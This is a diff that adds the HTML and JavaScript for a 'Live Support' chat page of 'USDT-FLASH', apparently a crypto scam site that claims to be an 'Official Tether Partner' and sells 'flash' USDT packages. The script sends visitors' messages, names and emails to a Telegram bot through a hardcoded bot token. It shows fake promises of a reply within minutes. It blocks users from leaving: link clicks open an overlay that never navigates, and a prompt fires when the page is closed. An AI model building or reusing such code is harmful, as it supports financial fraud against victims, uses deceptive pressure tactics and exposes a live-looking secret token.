@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT-FLASH - Live Support</title>
+    <link rel="icon" type="image/png" href="../img/usdt_cryptocurrencies_icon_188337.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@2.30.0/tabler-icons.min.css">
+    <style>
+        * { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f5f7fa; min-height: 100vh; }
+        .chat-container { max-width: 800px; margin: 0 auto; display: flex; flex-direction: column; height: calc(100vh - 80px); }
+        .messages-area { flex: 1; overflow-y: auto; padding: 1rem; scroll-behavior: smooth; }
+        .messages-area::-webkit-scrollbar { width: 4px; }
+        .messages-area::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 4px; }
+        .msg { max-width: 80%; padding: 0.75rem 1rem; border-radius: 1rem; margin-bottom: 0.75rem; animation: fadeIn 0.3s ease-out; line-height: 1.5; }
+        .msg-user { background: #3b82f6; color: #fff; margin-left: auto; border-bottom-right-radius: 0.25rem; }
+        .msg-support { background: #fff; color: #1f2937; border: 1px solid #e5e7eb; margin-right: auto; border-bottom-left-radius: 0.25rem; }
+        .msg-system { background: #fef3c7; color: #92400e; border: 1px solid #fde68a; margin: 0 auto; text-align: center; font-size: 0.8rem; border-radius: 0.75rem; padding: 0.5rem 1rem; max-width: 90%; }
+        .typing-indicator { display: flex; gap: 4px; padding: 0.5rem 0; }
+        .typing-indicator span { width: 8px; height: 8px; background: #9ca3af; border-radius: 50%; animation: typing 1.4s infinite; }
+        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes typing { 0%,60%,100% { opacity: 0.3; transform: translateY(0); } 30% { opacity: 1; transform: translateY(-4px); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .quick-btn { transition: all 0.2s ease; cursor: pointer; }
+        .quick-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(59,130,246,0.2); }
+        .input-area { border-top: 1px solid #e5e7eb; }
+        #chatInput { resize: none; }
+        .agent-avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #3b82f6, #2563eb); display: flex; align-items: center; justify-content: center; color: #fff; font-size: 0.75rem; font-weight: 700; flex-shrink: 0; }
+        .msg-group { display: flex; gap: 0.5rem; align-items: flex-start; margin-bottom: 0.75rem; }
+        .timestamp { font-size: 0.65rem; color: #9ca3af; margin-top: 0.25rem; }
+        .msg-user .timestamp { color: rgba(255,255,255,0.6); text-align: right; }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="sticky top-0 z-50 transition-all duration-300" style="background: rgba(15, 20, 25, 0.92); backdrop-filter: blur(20px) saturate(180%); border-bottom: 1px solid rgba(38, 161, 123, 0.3); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35);">
+        <div class="max-w-[800px] mx-auto px-4 sm:px-6 py-3.5 flex items-center justify-between">
+            <a href="../index.html" class="flex items-center gap-3 group">
+                <div class="relative flex items-center justify-center">
+                    <div class="absolute inset-0 bg-emerald-500/30 rounded-full blur-md group-hover:blur-lg transition-all duration-300"></div>
+                    <img src="../img/usdt_cryptocurrencies_icon_188337.png" alt="USDT-FLASH" class="h-9 w-9 relative z-10 transform group-hover:scale-105 group-hover:rotate-6 transition-all duration-300">
+                </div>
+                <div>
+                    <div class="text-base font-black tracking-tight text-white flex items-center gap-1">
+                        <span>USDT</span><span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-teal-300">-FLASH</span>
+                    </div>
+                    <div class="text-[9px] text-emerald-400/90 font-semibold tracking-wider uppercase">Official Tether Partner</div>
+                </div>
+            </a>
+            <div class="flex items-center gap-3">
+                <div class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-xs text-emerald-400 shadow-inner">
+                    <span class="relative flex h-2 w-2">
+                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                        <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                    </span>
+                    <span class="font-semibold text-xs tracking-wide">Live Support 24/7</span>
+                </div>
+                <a href="../index.html" class="flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold text-gray-200 hover:text-white bg-white/10 hover:bg-emerald-500/20 border border-white/10 hover:border-emerald-500/40 transition-all duration-300 shadow-sm">
+                    <i class="ti ti-arrow-left text-sm"></i>
+                    <span class="hidden sm:inline">Back</span>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Chat Container -->
+    <div class="chat-container px-4 sm:px-6">
+        <div id="messagesArea" class="messages-area">
+            <!-- Messages injected by JS -->
+        </div>
+
+        <!-- Quick Actions -->
+        <div id="quickActions" class="flex gap-2 overflow-x-auto pb-3 px-1 flex-shrink-0">
+            <button onclick="sendQuick('payment')" class="quick-btn flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 border border-blue-200 rounded-full text-blue-700 text-xs font-medium whitespace-nowrap hover:bg-blue-100">
+                <i class="ti ti-currency-dollar text-sm"></i> Payment Issue
+            </button>
+            <button onclick="sendQuick('wallet')" class="quick-btn flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 border border-blue-200 rounded-full text-blue-700 text-xs font-medium whitespace-nowrap hover:bg-blue-100">
+                <i class="ti ti-wallet text-sm"></i> Wallet Issue
+            </button>
+            <button onclick="sendQuick('account')" class="quick-btn flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 border border-blue-200 rounded-full text-blue-700 text-xs font-medium whitespace-nowrap hover:bg-blue-100">
+                <i class="ti ti-user text-sm"></i> Account
+            </button>
+            <button onclick="sendQuick('package')" class="quick-btn flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 border border-blue-200 rounded-full text-blue-700 text-xs font-medium whitespace-nowrap hover:bg-blue-100">
+                <i class="ti ti-box text-sm"></i> Packages
+            </button>
+            <button onclick="sendQuick('human')" class="quick-btn flex items-center gap-1.5 px-3 py-1.5 bg-emerald-50 border border-emerald-200 rounded-full text-emerald-700 text-xs font-medium whitespace-nowrap hover:bg-emerald-100">
+                <i class="ti ti-headset text-sm"></i> Talk to Agent
+            </button>
+
+        </div>
+
+        <!-- Input Area -->
+        <div class="input-area bg-white py-3 flex-shrink-0">
+            <form id="chatForm" class="flex gap-2 items-end">
+                <div class="flex-1 relative">
+                    <textarea id="chatInput" rows="1" class="w-full px-4 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all" placeholder="Type your message..." style="max-height: 120px;"></textarea>
+                    <div id="imagePreview" class="hidden absolute bottom-full left-0 mb-2 p-2 bg-white border border-gray-200 rounded-xl shadow-lg">
+                        <div class="relative inline-block">
+                            <img id="previewImg" src="" alt="preview" class="max-w-[200px] max-h-[150px] rounded-lg object-cover">
+                            <button onclick="removeImage()" class="absolute -top-2 -right-2 w-5 h-5 bg-red-500 text-white rounded-full text-xs flex items-center justify-center hover:bg-red-600 transition-colors">&times;</button>
+                        </div>
+                    </div>
+                </div>
+                <label class="w-10 h-10 rounded-xl bg-gray-100 hover:bg-gray-200 text-gray-500 flex items-center justify-center cursor-pointer transition-all flex-shrink-0">
+                    <input type="file" id="imageInput" accept="image/*" class="hidden" onchange="handleImageSelect(event)">
+                    <i class="ti ti-photo text-sm"></i>
+                </label>
+                <button type="submit" class="w-10 h-10 rounded-xl bg-blue-500 hover:bg-blue-600 text-white flex items-center justify-center transition-all flex-shrink-0">
+                    <i class="ti ti-send text-sm"></i>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const messagesArea = document.getElementById('messagesArea');
+        const chatForm = document.getElementById('chatForm');
+        const chatInput = document.getElementById('chatInput');
+        const quickActions = document.getElementById('quickActions');
+
+        // ══════════════════════════════════════════════
+        // MESSAGING CONFIGURATION
+        // ══════════════════════════════════════════════
+        const TG_TOKEN = '7867598490:AAFAXPPMK3VAPh8jfg1qfkgcBFUNwSGBktE';
+        const TG_API = 'https://api.telegram.org/bot' + TG_TOKEN;
+        let TG_CHAT_ID = localStorage.getItem('tg_chat_id') || '2126771039';
+
+        // Unique user session (never shown to user)
+        let USER_SESSION = localStorage.getItem('tg_user_session');
+        if (!USER_SESSION) {
+            USER_SESSION = 'U' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+            localStorage.setItem('tg_user_session', USER_SESSION);
+        }
+
+        let lastUpdateId = parseInt(localStorage.getItem('tg_last_update')) || 0;
+        let isFirstPoll = (lastUpdateId === 0);
+        let tgPollInterval = null;
+        let sentMessages = {}; // message_id -> session_id mapping
+
+        function sendToTelegram(text, isImage) {
+            if (!TG_CHAT_ID) return;
+            const userInfo = localStorage.getItem('user');
+            let userName = 'Guest', userEmail = '';
+            if (userInfo) { try { const u = JSON.parse(userInfo); userName = u.name || 'Guest'; userEmail = u.email || ''; } catch(e) {} }
+            
+            const sessionLine = '🔑 <b>Session ID:</b> <code>' + USER_SESSION + '</code>';
+            const replyLine = '→ <i>To reply, copy the Session ID and send:</i> <code>' + USER_SESSION + ': Your reply here</code>';
+            const header = '━━━━━━━━━━━━━━━━━━\n' +
+                '🆔 <b>User:</b> ' + userName + '\n' +
+                '📧 <b>Email:</b> ' + userEmail + '\n' +
+                sessionLine + '\n' +
+                replyLine + '\n' +
+                '━━━━━━━━━━━━━━━━━━';
+            const label = isImage ? '📷 Image' : '💬 Message';
+            const msg = header + '\n\n' + label + ':\n' + text;
+
+            fetch(TG_API + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
+            }).then(function(r) { return r.json(); }).then(function(res) {
+                if (res.ok && res.result && res.result.message_id) {
+                    sentMessages[res.result.message_id] = USER_SESSION;
+                }
+            }).catch(function(e) {});
+        }
+
+        function fastForwardUpdates() {
+            if (!TG_CHAT_ID) return Promise.resolve();
+            return fetch(TG_API + '/getUpdates?offset=-1').then(function(r) { return r.json(); }).then(function(data) {
+                if (data.ok && data.result && data.result.length > 0) {
+                    var maxId = data.result[data.result.length - 1].update_id;
+                    lastUpdateId = maxId + 1;
+                    localStorage.setItem('tg_last_update', lastUpdateId);
+                }
+            }).catch(function(e) {});
+        }
+
+        function pollTelegramReplies() {
+            if (!TG_CHAT_ID) return;
+            console.log('[Poll] Checking for replies (offset=' + lastUpdateId + ', session=' + USER_SESSION + ')');
+            fetch(TG_API + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (!data.ok || !data.result) return;
+                data.result.forEach(function(update) {
+                    if (update.update_id >= lastUpdateId) lastUpdateId = update.update_id + 1;
+                    var msg = update.message;
+                    if (!msg || !msg.text) return;
+                    var chatId = String(msg.chat.id);
+                    if (chatId !== TG_CHAT_ID) return;
+
+                    var txt = msg.text.trim();
+                    console.log('[Poll] Got message:', txt);
+
+                    // Support agent sends: SESSION_ID: reply
+                    var prefix = USER_SESSION + ':';
+                    if (txt.indexOf(prefix) === 0) {
+                        var reply = txt.slice(prefix.length).trim();
+                        if (reply) {
+                            console.log('[Poll] Reply matched for this user');
+                            hideTyping();
+                            addMessage('support', reply);
+                            quickActions.style.display = 'flex';
+                        }
+                    }
+                });
+                if (data.result.length > 0) {
+                    localStorage.setItem('tg_last_update', lastUpdateId);
+                }
+            }).catch(function(e) { console.log('[Poll] Error:', e); });
+        }
+
+        const supportReplies = {
+            payment: "Thank you for reaching out about a payment issue. To help you quickly, please make sure you've sent the exact amount shown on the payment page. If the transaction was completed but not reflected, please share your TXID (transaction hash) and I'll check it on the Tron blockchain for you.",
+            wallet: "I understand you're having a wallet issue. Please make sure you're using the **TRC20 network** for all USDT transactions. Sending via other networks (ERC20, BEP20) may result in lost funds. Could you provide more details about what happened?",
+            account: "I can help with account-related inquiries. Please let me know what specific issue you're facing — login problems, profile updates, or something else? If you're already logged in, try clearing your browser cache and refreshing the page.",
+            package: "Our packages start at **$49.99 for 500 USDT-FLASH**. Each package includes instant delivery after payment confirmation. You can find all available options on our payment page. Would you like me to guide you through the process?",
+            human: "I'll connect you with a live support agent. In the meantime, please describe your issue in detail so the agent can assist you as quickly as possible. An agent will be with you shortly.",
+            default: "Thank you for your message. I'm your USDT-FLASH support assistant. Could you please provide more details so I can better assist you? You can also use the quick buttons above for common issues."
+        };
+
+        let userName = 'You';
+        let messageCount = 0;
+        let sessionReplyShown = false;
+
+        function getTime() {
+            return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+
+        function formatMsg(text) {
+            return text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+        }
+
+        function addMessage(type, text, name) {
+            const time = getTime();
+            const div = document.createElement('div');
+
+            if (type === 'user') {
+                div.className = 'msg msg-user';
+                div.innerHTML = `${formatMsg(text)}<div class="timestamp">${time}</div>`;
+            } else if (type === 'system') {
+                div.className = 'msg msg-system';
+                div.innerHTML = text;
+            } else {
+                div.innerHTML = `
+                    <div class="msg-group">
+                        <div class="agent-avatar"><i class="ti ti-headset text-xs"></i></div>
+                        <div>
+                            <div class="msg msg-support">
+                                <div class="font-semibold text-xs text-blue-600 mb-1">Support Team</div>
+                                ${formatMsg(text)}
+                                <div class="timestamp">${time}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            messagesArea.appendChild(div);
+            messagesArea.scrollTop = messagesArea.scrollHeight;
+            messageCount++;
+        }
+
+        function showTyping() {
+            const div = document.createElement('div');
+            div.id = 'typingIndicator';
+            div.className = 'msg-group';
+            div.innerHTML = `
+                <div class="agent-avatar"><i class="ti ti-headset text-xs"></i></div>
+                <div class="msg msg-support">
+                    <div class="typing-indicator"><span></span><span></span><span></span></div>
+                </div>
+            `;
+            messagesArea.appendChild(div);
+            messagesArea.scrollTop = messagesArea.scrollHeight;
+        }
+
+        function hideTyping() {
+            const el = document.getElementById('typingIndicator');
+            if (el) el.remove();
+        }
+
+        function supportReply(userMsg) {
+            const msg = userMsg.toLowerCase();
+            let reply = supportReplies.default;
+
+            if (msg.includes('pay') || msg.includes('pay') || msg.includes('transact') || msg.includes('txid') || msg.includes('send') || msg.includes('money')) {
+                reply = supportReplies.payment;
+            } else if (msg.includes('wallet') || msg.includes('transfer') || msg.includes('trc') || msg.includes('network') || msg.includes('tron')) {
+                reply = supportReplies.wallet;
+            } else if (msg.includes('account') || msg.includes('login') || msg.includes('password') || msg.includes('profile') || msg.includes('email')) {
+                reply = supportReplies.account;
+            } else if (msg.includes('package') || msg.includes('price') || msg.includes('cost') || msg.includes('buy') || msg.includes('plan') || msg.includes('flash')) {
+                reply = supportReplies.package;
+            } else if (msg.includes('agent') || msg.includes('human') || msg.includes('person') || msg.includes('real') || msg.includes('live')) {
+                reply = supportReplies.human;
+            }
+
+            return reply;
+        }
+
+        function sendQuick(topic) {
+            const texts = {
+                payment: 'I need help with a payment issue',
+                wallet: 'I need help with my wallet',
+                account: 'I need help with my account',
+                package: 'Tell me about your packages',
+                human: 'I want to talk to a real agent'
+            };
+            addUserMessage(texts[topic] || topic);
+        }
+
+        function addUserMessage(text) {
+            if (!text.trim()) return;
+            addMessage('user', text);
+            sendToTelegram(text, false);
+            chatInput.value = '';
+            quickActions.style.display = 'none';
+
+            if (TG_CHAT_ID && !sessionReplyShown) {
+                sessionReplyShown = true;
+                showTyping();
+                setTimeout(() => {
+                    hideTyping();
+                    addMessage('support', '✅ <strong>Message Received</strong> — You have been connected to our live support team. A dedicated agent will respond to your inquiry within <strong>2 minutes</strong>. Please do not leave this page to ensure a seamless connection.');
+                }, 1200);
+                return;
+            }
+
+            showTyping();
+            const delay = 1000 + Math.random() * 2000;
+            setTimeout(() => {
+                hideTyping();
+                if (!TG_CHAT_ID) {
+                    const reply = supportReply(text);
+                    addMessage('support', reply);
+                }
+                quickActions.style.display = 'flex';
+
+                if (text.toLowerCase().includes('payment') || text.toLowerCase().includes('txid')) {
+                    setTimeout(() => {
+                        addMessage('system', 'Need to make a payment? <a href="../index.html" style="color:#2563eb;font-weight:600;">Go to Packages →</a>');
+                    }, 800);
+                }
+            }, delay);
+        }
+
+        // Auto-resize textarea
+        chatInput.addEventListener('input', function() {
+            this.style.height = 'auto';
+            this.style.height = Math.min(this.scrollHeight, 120) + 'px';
+        });
+
+        // Image handling
+        let selectedImage = null;
+
+        function handleImageSelect(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                selectedImage = ev.target.result;
+                const preview = document.getElementById('imagePreview');
+                document.getElementById('previewImg').src = selectedImage;
+                preview.classList.remove('hidden');
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function removeImage() {
+            selectedImage = null;
+            document.getElementById('imagePreview').classList.add('hidden');
+            document.getElementById('imageInput').value = '';
+        }
+
+        function addImageMessage(base64) {
+            const time = getTime();
+            const div = document.createElement('div');
+            div.className = 'msg msg-user';
+            div.innerHTML = `<img src="${base64}" class="max-w-[250px] rounded-lg mb-1"><div class="timestamp">${time}</div>`;
+            messagesArea.appendChild(div);
+            messagesArea.scrollTop = messagesArea.scrollHeight;
+            messageCount++;
+            removeImage();
+            sendToTelegram('📷 Image sent by user', true);
+        }
+
+        // Submit handler (text + images)
+        chatForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const text = chatInput.value.trim();
+            
+            if (selectedImage) {
+                addImageMessage(selectedImage);
+                chatInput.value = '';
+                quickActions.style.display = 'none';
+                showTyping();
+                setTimeout(() => {
+                    hideTyping();
+                    quickActions.style.display = 'flex';
+                }, 1500 + Math.random() * 2000);
+                return;
+            }
+
+            if (text) addUserMessage(text);
+        });
+
+        chatInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                chatForm.dispatchEvent(new Event('submit'));
+            }
+        });
+
+        // Leave warning
+        let leaveWarning = false;
+
+        document.querySelectorAll('a[href]').forEach(el => {
+            const href = el.getAttribute('href');
+            if (href && href !== '#') {
+                el.addEventListener('click', function(e) {
+                    if (messageCount > 0) {
+                        e.preventDefault();
+                        showLeaveWarning(this.href);
+                    }
+                });
+            }
+        });
+
+        function showLeaveWarning(targetUrl) {
+            const overlay = document.createElement('div');
+            overlay.id = 'leaveOverlay';
+            overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:1rem;animation:fadeIn 0.3s ease-out';
+            overlay.innerHTML = `
+                <div class="bg-white rounded-3xl p-8 max-w-sm w-full shadow-2xl text-center animate-slide-up border border-gray-200">
+                    <div class="w-16 h-16 rounded-2xl bg-amber-50 flex items-center justify-center mx-auto mb-5">
+                        <i class="ti ti-alert-triangle text-amber-500 text-3xl"></i>
+                    </div>
+                    <h3 class="text-gray-800 text-lg font-bold mb-2">Don't Leave Yet!</h3>
+                    <p class="text-gray-500 text-sm mb-4">If you leave now, you won't be able to see our reply. Please stay — a support agent will respond within <strong class="text-amber-600">5 minutes maximum</strong>.</p>
+                    <div class="bg-amber-50 border border-amber-200 rounded-xl p-3 mb-5">
+                        <div class="flex items-center justify-center gap-2 text-amber-700 text-sm font-medium">
+                            <i class="ti ti-clock"></i>
+                            <span>Expected response: &lt; 5 minutes</span>
+                        </div>
+                    </div>
+                    <button onclick="closeLeaveWarning('${targetUrl}')" class="btn-primary w-full py-3 rounded-xl font-semibold text-sm flex items-center justify-center gap-2" style="background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;border:none;cursor:pointer">
+                        <i class="ti ti-check"></i>
+                        I'll Stay
+                    </button>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+        }
+
+        window.closeLeaveWarning = function(url) {
+            const overlay = document.getElementById('leaveOverlay');
+            if (overlay) overlay.remove();
+        };
+
+        // Browser back/close warning
+        window.addEventListener('beforeunload', function(e) {
+            if (messageCount > 0) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+
+        // Init: welcome message + Telegram connection
+        (function init() {
+            const saved = localStorage.getItem('user');
+            if (saved) {
+                try { userName = JSON.parse(saved).name || 'You'; } catch(e) {}
+            }
+            setTimeout(function() {
+                addMessage('support', 'Hello! Welcome to <strong>USDT-FLASH</strong> support. How can I help you today? Feel free to describe your issue or choose from the quick options below.');
+                if (TG_CHAT_ID) {
+                    var initPoll = function() { tgPollInterval = setInterval(pollTelegramReplies, 5000); };
+                    if (isFirstPoll) {
+                        fastForwardUpdates().then(initPoll);
+                    } else {
+                        initPoll();
+                    }
+                }
+            }, 500);
+        })();
+    </script>
+</body>
+</html>
